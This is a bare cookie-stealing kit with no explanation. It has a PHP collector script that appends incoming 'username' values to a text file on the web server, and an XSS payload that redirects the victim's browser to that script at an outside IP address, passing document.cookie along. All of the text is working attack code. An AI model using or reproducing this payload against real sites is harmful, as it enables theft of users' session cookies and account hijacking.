
-------------------
<?php
$cookie = $_GET["username"];
$steal = fopen("/var/www/html/cookiefile.txt", "a+");
fwrite($steal, $cookie ."\n");
fclose($steal);
?>
-------------------
<script>document.location="http://10.50.20.97/Cookie_Stealer1.php?username=" + document.cookie;</script>



